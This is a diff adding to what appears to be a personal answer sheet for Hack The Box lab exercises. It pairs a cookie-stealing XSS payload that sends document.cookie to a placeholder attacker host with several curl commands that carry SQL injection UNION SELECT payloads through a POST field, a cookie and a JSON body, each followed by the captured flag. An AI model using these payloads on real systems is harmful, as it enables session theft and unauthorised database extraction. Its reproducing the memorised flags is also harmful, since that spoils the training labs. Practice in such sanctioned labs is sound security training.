@@ -136,3 +136,20 @@ Vulnerable field: comment Website input. Payload:
   "><script>new Image().src='http://ATTACKER/catch?c='+document.cookie;</script>
 Captured: ...flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
 ANSWER: HTB{cr055_5173_5cr1p71n6_n1nj4}
+
+---
+# SQLMap Essentials - Cases (target 154.57.164.79:40261)
+All queries: 9-col table (case2/3), 6-col (case4). DB tables flagN have columns (id, content).
+
+## Case 2 - POST parameter id
+curl -X POST http://154.57.164.79:40261/case2.php --data-urlencode "id=0 union select 1,2,3,4,5,6,7,8,(select content from flag2)"
+ANSWER flag2: HTB{700_much_c0n6r475_0n_p057_r3qu357}
+
+## Case 3 - Cookie value id
+curl -b "id=0 union select 1,2,3,4,5,6,7,8,(select content from flag3)" http://154.57.164.79:40261/case3.php
+ANSWER flag3: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
+
+## Case 4 - JSON body {"id": "..."}  (value inserted UNQUOTED)
+printf '{"id":"0 union select 1,2,3,4,5,(select content from flag4)"}' > /tmp/c4.json
+curl -X POST http://154.57.164.79:40261/case4.php -H 'Content-Type: application/json' --data-binary @/tmp/c4.json
+ANSWER flag4: HTB{j450n_v00rh335_53nd5_6r475}
